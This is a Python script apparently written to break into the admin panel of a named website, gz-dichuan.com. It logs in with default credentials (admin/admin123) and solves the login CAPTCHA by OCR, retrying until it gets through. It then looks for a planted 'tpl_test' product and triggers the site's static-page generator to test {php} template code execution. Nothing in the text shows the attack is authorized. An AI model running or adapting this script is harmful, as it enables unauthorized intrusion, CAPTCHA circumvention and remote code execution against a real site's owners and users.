#!/usr/bin/env python3
"""gz: login (fresh), check tpl_test goods + test {php} execution via staticweb"""
import urllib.request, urllib.parse, re, http.cookiejar, base64, subprocess, sys, time

HOST = "http://gz-dichuan.com"
UA = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}

def ocr(img_bytes):
    b64 = base64.b64encode(img_bytes).decode()
    code = ("import ddddocr,base64; o=ddddocr.DdddOcr(show_ad=False); "
            "print(o.classification(base64.b64decode('%s')))" % b64)
    r = subprocess.run([sys.executable, "-c", code], capture_output=True, timeout=20, cwd="/tmp")
    return r.stdout.decode().strip()

cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

def fetch(url, data=None, timeout=15, headers=None):
    h = {**UA, "Content-Type": "application/x-www-form-urlencoded"}
    if headers: h.update(headers)
    try:
        req = urllib.request.Request(url, data=data.encode() if data else None, headers=h)
        r = op.open(req, timeout=timeout)
        return r.status, r.geturl(), r.read()
    except urllib.error.HTTPError as e:
        return e.code, url, e.read()
    except Exception as ex:
        return 0, url, str(ex).encode()

# login with retry
for attempt in range(12):
    try:
        code, final, body = fetch(HOST + "/index.php?m=admin&c=login&a=index")
        code, final, cap = fetch(HOST + "/index.php?m=admin&c=login&a=vertify",
                                 headers={"Referer": HOST + "/index.php?m=admin&c=login&a=index"})
        cap_text = ocr(cap)
        data = urllib.parse.urlencode({"username": "admin", "password": "admin123", "vertify": cap_text})
        code, final, resp = fetch(HOST + "/index.php?m=admin&c=login&a=login", data=data,
                                  headers={"Referer": HOST + "/index.php?m=admin&c=login&a=index",
                                           "X-Requested-With": "XMLHttpRequest"})
        rt = resp.decode("utf-8", "ignore")
        if "登录成功" in rt or '"status":1' in rt:
            print("login ok (attempt %d OCR=%s)" % (attempt, cap_text))
            break
    except Exception:
        pass
else:
    print("login failed"); sys.exit(1)

# check goods list for tpl_test
code, final, body = fetch(HOST + "/index.php?m=admin&c=goods&a=index",
                          headers={"Referer": HOST + "/index.php?m=admin&c=index&a=index"})
bt = body.decode("utf-8", "ignore")
open("/tmp/gz_goods4.html", "w").write(bt)
print("goods index size:", len(bt))
if "tpl_test" in bt:
    print(">>> tpl_test FOUND in goods list!")
else:
    print("tpl_test not in list - search editdrugs ids")
    ids = re.findall(r'drugs_id=(\d+)', bt)
    print("drugs_ids:", ids[:20])

# search by keyword
code, final, body = fetch(HOST + "/index.php?m=admin&c=goods&a=index&keyword=tpl_test",
                          headers={"Referer": HOST + "/index.php?m=admin&c=index&a=index"})
bt = body.decode("utf-8", "ignore")
print("search tpl_test size:", len(bt), "found:", "tpl_test" in bt)
ids = re.findall(r'drugs_id=(\d+)', bt)
print("search ids:", ids[:10])

# try staticweb generate for candidate ids
for idv in ["52", "53", "54", "55"]:
    code, final, body = fetch(HOST + "/index.php?m=admin&c=other&a=staticweb&id=" + idv,
                              headers={"Referer": HOST + "/index.php?m=admin&c=other&a=staticweb"})
    print("staticweb id=%s: %s %s" % (idv, code, body.decode("utf-8", "ignore")[:120]))
